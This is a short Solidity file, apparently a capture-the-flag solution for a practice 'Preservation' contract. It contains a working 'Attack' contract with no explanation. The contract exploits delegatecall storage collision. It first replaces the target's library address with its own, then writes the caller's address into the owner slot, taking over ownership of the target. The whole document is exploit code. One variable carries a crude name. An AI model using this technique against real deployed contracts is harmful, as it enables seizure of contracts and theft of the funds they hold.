pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    address hello;
    address there;
    uint256 bitch;
    Preservation preserve;

    constructor(address _preserve) public {
        preserve = Preservation(_preserve);
    }

    function stealLibrary() public {
        uint256 meInt = uint256(address(this));
        preserve.setFirstTime(meInt);
    }

    function setOwner() public {
        uint256 meInt = uint256(tx.origin);
        preserve.setFirstTime.gas(1000000)(meInt);
    }

    function setTime(uint256 _time) public {
        bitch = _time;
    }
}
